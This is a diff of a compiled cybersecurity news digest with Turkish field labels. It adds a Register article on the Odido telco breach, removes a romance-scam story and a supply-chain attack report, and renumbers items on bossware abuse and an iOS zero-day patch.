-But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.
-
-Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.
-
-Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.
-
-Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.
-
-Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.
-
-But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.
-
-Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.
-
-A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.
-
-Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.
-
-The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.
-
-Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.
-
-(XXXXXXX, AÇIK - bitdefender.com, 13/02/2026)
 
 ================================================================================
 
@@ -1698,7 +1532,71 @@ US wants to push its view of AI cybersecurity standards to the rest of the world
 
 ================================================================================
 
-[28] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too
+[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper
+────────────────────────────────────────────────────────────────────────────────
+Tarih: 2026-02-13T11:45:13.00Z
+Link: https://go.theregister.com/feed/www.theregister.com/2026/02/13/odido_breach/
+
+[TAM METİN - 550 kelime]
+Top Dutch telco Odido admits 6.2M customers caught in contact system caper
+
+Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched
+
+The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.
+
+Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.
+
+The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.
+
+It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.
+
+Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.
+
+Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.
+
+The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.
+
+In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.
+
+Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.
+
+Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy
+
+Devilish devs spawn 287 Chrome extensions to flog your browser history to data brokers
+
+Nearly 17,000 Volvo staff dinged in supplier breach
+
+Dutch data watchdog snitches on itself after getting caught in Ivanti zero-day attacks
+
+Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.
+
+CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.
+
+"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.
+
+"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.
+
+"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."
+
+The Register approached Odido for more information. ®
+
+Emergency Services Network
+
+National Broadband Network
+
+Telecommunications Act of 1996
+
+Emergency Services Network
+
+National Broadband Network
+
+Telecommunications Act of 1996
+
+(XXXXXXX, AÇIK - go.theregister.com, 13/02/2026)
+
+================================================================================
+
+[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: 2026-02-12T20:07:13.00Z
 Link: https://go.theregister.com/feed/www.theregister.com/2026/02/12/ransomware_slingers_bossware/
@@ -1808,7 +1706,7 @@ Trusted Platform Module
 
 ================================================================================
 
-[29] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware
+[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: 2026-02-12T14:01:13.00Z
 Link: https://go.theregister.com/feed/www.theregister.com/2026/02/12/apple_ios_263/
@@ -1847,60 +1745,6 @@ By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, 
 "This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."
 
 Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®
-
-(XXXXXXX, AÇIK - go.theregister.com, 13/02/2026)
-
-================================================================================
-
-[30] The Register - Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy
-────────────────────────────────────────────────────────────────────────────────
-Tarih: 2026-02-12T11:59:09.00Z
-Link: https://go.theregister.com/feed/www.theregister.com/2026/02/12/supply_chain_attacks/
-
-[TAM METİN - 534 kelime]
-Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy
-
-Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle
-
-Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.
-
-In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.
-
-Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.
-
-"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."
-
-Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.
-
-It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.
-
-Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.
-
-Evolution of data breaches
-
-The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.
-
-Google: China's APT31 used Gemini to plan cyberattacks against US orgs
-
-Payroll pirates are conning help desks to steal workers' identities and redirect paychecks
-
-Singapore spent 11 months booting China-linked snoops out of telco networks
-
-Nearly 17,000 Volvo staff dinged in supplier breach
-
-Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.
-
-"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.
-
-"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."
-
-Organizations should treat third parties as extensions of their own attack surface.
-
-"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®
-
-Supply Chain Security Week
-
-Supply Chain Security Week
 
 (XXXXXXX, AÇIK - go.theregister.com, 13/02/2026)
 
